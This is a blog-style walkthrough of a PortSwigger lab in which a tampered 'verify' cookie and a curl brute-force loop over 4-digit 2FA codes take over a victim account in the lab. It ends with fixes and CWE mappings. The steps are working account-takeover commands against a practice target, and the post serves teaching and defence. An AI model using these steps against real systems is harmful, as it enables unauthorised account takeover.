---
layout: post
title: "PortSwigger: 2FA broken logic"
date: 2027-11-07 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, 2fa, mfa, brute-force, idor, cwe-639, cwe-287]
---

Two-factor authentication is only as strong as the logic that ties the second factor to *you*. This lab ships a 2FA flow that decides **whose** code to generate and check based on a cookie the browser sends — not the session that just passed the password step. Control that cookie and you control whose account you're attacking. The result is a full account takeover of a victim whose **password you never learn**, using nothing but `curl`. This is [CWE-639](https://cwe.mitre.org/data/definitions/639.html) (authorization bypass through a user-controlled key) compounded by [CWE-287](https://cwe.mitre.org/data/definitions/287.html) (improper authentication — a short code with no lockout).

## Overview

The login is two stages:

- `POST /login` — checks `username` + `password`.
- `GET /login2` — generates and emails the 2FA code.
- `POST /login2` — verifies the `mfa-code` you type.

The flaw is in how the second stage knows *which* user it's working for. Log in normally and watch the response:

```
HTTP/2 302
location: /login2
set-cookie: verify=wiener; HttpOnly
set-cookie: session=cB21XQx1MBsO8yEgEsN4918HavBICjKT; Secure; HttpOnly; SameSite=None
```

That `verify=wiener` cookie is the only thing telling the server whose second factor this is. It's client-side. So we get to change it.

## Step 1 — log in with your own account

```bash
U="https://<lab-id>.web-security-academy.net"
S=$(curl -sk -D - -o /dev/null "$U/login" \
  --data-urlencode "username=wiener" --data-urlencode "password=peter" \
  | grep -oiP 'set-cookie: session=\K[^;]+')
echo "$S"
```

We keep the `session` cookie from the password stage. We're about to throw away its `verify=wiener` and substitute the victim.

## Step 2 — trigger the victim's 2FA code

Set `verify=carlos` and request the 2FA page. The server generates **carlos's** code (and emails it to carlos) — we only needed his username:

```bash
curl -sk -b "session=$S; verify=carlos" "$U/login2" -o /dev/null -w "%{http_code}\n"
# 200 — carlos's code is now live
```

## Step 3 — brute-force the 4-digit code

`POST /login2` verifies the code against carlos's flow because `verify=carlos`. The form has **no CSRF token and no rate-limit/lockout**, so a 4-digit code is just 10,000 guesses. A correct guess returns `302` to carlos's account:

```bash
for c in $(seq -w 0 9999); do
  code=$(curl -sk -o /dev/null -w '%{http_code}' \
    -b "session=$S; verify=carlos" "$U/login2" -d "mfa-code=$c")
  [ "$code" = 302 ] && { echo "CODE=$c"; break; }
done
```

Over HTTPS the serial loop is slow — thread it with Python `requests` + `ThreadPoolExecutor(40)`, `allow_redirects=False`, and stop on the first `302`. In testing the code was `0056`, found in well under a minute. The winning request:

```
POST /login2 HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<post-login-session>; verify=carlos
Content-Type: application/x-www-form-urlencoded

mfa-code=0056
```

```
HTTP/2 302
location: /my-account?id=carlos
set-cookie: session=DilLjgbSctzfZd7YJe0eNdlVzmpDTJOV; Secure; HttpOnly; SameSite=None
```

That new `session` cookie is carlos's authenticated session.

## Step 4 — confirm

```bash
curl -sk -b "session=DilLjgbSctzfZd7YJe0eNdlVzmpDTJOV" "$U/my-account?id=carlos" \
  | grep -i 'Your username is'
# Your username is: carlos
```

The lab's status widget flips to **Solved**.

## Why it worked

The second factor is bound to a value the attacker controls (`verify`), not to the session that completed the password step. That's a horizontal-authorization break: knowing only a victim's username lets you (a) **make the server send their code on demand** and (b) **submit guesses against their verification flow**. Pair that with a short code and no lockout, and MFA provides zero protection.

## Fix

- Bind the second factor to the server-side session that passed the password step — never to a client-supplied username, cookie, or form field.
- Rate-limit and lock out per account after a few wrong codes; make each code single-use and time-boxed.
- Use longer codes so brute force is infeasible.
- Re-require the password factor if the 2FA target identity ever changes.

Mapped to [CWE-639](https://cwe.mitre.org/data/definitions/639.html) and [CWE-287](https://cwe.mitre.org/data/definitions/287.html) — A07:2021 Identification and Authentication Failures.
